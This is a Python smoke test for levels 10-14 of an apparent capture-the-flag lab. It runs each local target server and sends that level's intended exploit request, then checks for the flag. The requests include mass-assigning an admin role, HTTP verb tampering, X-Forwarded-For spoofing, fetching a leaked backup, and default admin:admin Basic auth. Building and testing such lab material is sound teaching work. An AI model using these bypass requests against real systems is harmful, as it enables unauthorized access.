"""Smoke test dos niveis 10-14: sobe cada alvo num thread e testa o exploit previsto."""
import base64, threading, time, importlib, os, sys
import http.server
import requests

CASES = [
    ("targets/level10_massassign.py", 8009, "flag{m4ss_4ss1gnm3nt_r0l3_fr0m_cl13nt}",
     lambda b: requests.post(f"{b}/register", data={"username":"x","password":"y","role":"admin"}, timeout=5).text),
    ("targets/level11_verb.py", 8010, "flag{http_v3rb_t4mp3r1ng_byp4ss}",
     lambda b: requests.post(f"{b}/admin", timeout=5).text),
    ("targets/level12_xff.py", 8011, "flag{x_f0rw4rd3d_f0r_sp00f_1nt3rn4l}",
     lambda b: requests.get(f"{b}/admin", headers={"X-Forwarded-For":"10.0.0.5"}, timeout=5).text),
    ("targets/level13_disclosure.py", 8012, "flag{r0b0ts_d1s4ll0w_l34ks_th3_b4ckup}",
     lambda b: requests.get(f"{b}/backup/db_dump.bak", timeout=5).text),
    ("targets/level14_basicauth.py", 8013, "flag{b4s1c_4uth_d3f4ult_cr3ds_pwn3d}",
     lambda b: requests.get(f"{b}/admin", headers={"Authorization":"Basic "+base64.b64encode(b'admin:admin').decode()}, timeout=5).text),
]

def load_handler(path):
    name = os.path.splitext(os.path.basename(path))[0]
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.Handler

ok = True
for path, port, flag, exploit in CASES:
    Handler = load_handler(path)
    srv = http.server.HTTPServer(("127.0.0.1", port), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True); t.start()
    time.sleep(0.2)
    base = f"http://127.0.0.1:{port}"
    try:
        body = exploit(base)
        passed = flag in body
    except Exception as exc:
        passed, body = False, f"ERRO: {exc}"
    print(("PASS" if passed else "FAIL"), os.path.basename(path))
    if not passed:
        print("   ->", body[:200]); ok = False
    srv.shutdown()

sys.exit(0 if ok else 1)
